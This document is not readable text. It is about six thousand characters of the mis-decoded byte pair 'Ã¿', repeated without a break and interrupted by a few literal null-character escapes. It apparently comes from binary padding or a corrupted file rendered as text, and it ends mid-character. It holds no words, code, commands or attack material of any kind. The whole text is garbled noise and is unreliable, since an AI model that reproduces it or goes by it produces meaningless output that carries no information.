Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã